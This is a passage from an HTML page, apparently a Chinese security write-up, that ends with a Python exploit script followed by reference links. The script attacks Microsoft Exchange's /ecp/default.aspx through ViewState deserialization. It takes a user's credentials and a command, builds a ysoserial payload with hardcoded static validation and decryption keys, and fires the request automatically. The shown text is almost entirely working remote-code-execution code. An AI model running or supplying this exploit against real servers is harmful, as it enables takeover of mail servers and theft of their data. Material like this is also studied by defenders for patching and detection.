class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-u&quot;, &quot;--user&quot;, required=True, help=&quot;login account Example: domain\\user&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-p&quot;, &quot;--password&quot;, required=True, help=&quot;Password&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command u want to execute&quot;, required=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-e&quot;, &quot;--encrypt&quot;, help=&quot;Encrypt the payload&quot;, action=&#39;store_true&#39;,default=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;args = parser.parse_args()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = args.server</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[*] Start to exploit..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;user = args.user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pwd = args.password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;command = args.cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;view, key, base_url = get_value(url, user, pwd)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if key is None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key = &#39;test&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ex_payload = &quot;&quot;&quot;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;{}&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;{}&quot; --viewstateuserkey=&quot;{}&quot; --islegacy &quot;&quot;&quot;.format(command,view,key)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.encrypt:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;re_payload = ex_payload + &#39; --decryptionalg=&quot;3DES&quot; --decryptionkey=&quot;E9D2490BD0075B51D1BA5288514514AF&quot; --isencrypted&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;re_payload = ex_payload + &quot; --isdebug&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;\n&quot;+re_payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;out_payload = ysoserial(re_payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.encrypt:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final_exp = &quot;{}/ecp/default.aspx?__VIEWSTATEENCRYPTED=&amp;__VIEWSTATE={}&quot;.format(base_url, quote(out_payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final_exp = &quot;{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&amp;__VIEWSTATE={}&quot;.format(base_url, view, quote(out_payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;\n[+] Exp url: {}&quot;.format(final_exp))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;\n[*] Auto trigger payload..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;status = session.get(final_exp,verify=False,timeout=15)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if status.status_code==500:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*] Status code: %i, Maybe success!&quot; % status.status_code)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;main()</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.anquanke.com/post/id/199772"><span class="cs4B51D5E4">https://www.anquanke.com/post/id/199772</span></a></span></p><p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.t00ls.net/thread-55149-1-1.html"><span class="cs4B51D5E4">https://www.t00ls.net/thread-55149-1-1.html</span></a></span></p></body>
</html>
